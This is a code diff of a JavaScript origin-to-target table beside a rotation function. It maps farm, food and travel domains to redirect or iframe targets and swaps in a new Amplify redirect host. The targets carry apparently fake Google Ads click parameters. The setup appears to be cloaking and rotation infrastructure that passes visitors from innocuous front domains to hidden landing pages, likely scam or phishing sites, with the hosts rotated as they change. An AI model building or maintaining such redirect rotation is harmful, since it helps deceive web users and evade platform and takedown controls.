@@ -85,9 +85,9 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.farm": { method: "redirect", target: "https://main.d21wur5qjyqo2h.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d21wur5qjyqo2h.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d21wur5qjyqo2h.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://naotoshidairy.farm": { method: "redirect", target: "https://main.d163hn5is29yl2.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d163hn5is29yl2.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d163hn5is29yl2.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
@@ -95,7 +95,7 @@ const ORIGIN_GROUPS = {
     "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d21wur5qjyqo2h.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d163hn5is29yl2.amplifyapp.com/?gad_campaign=210687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
   },
 };
 
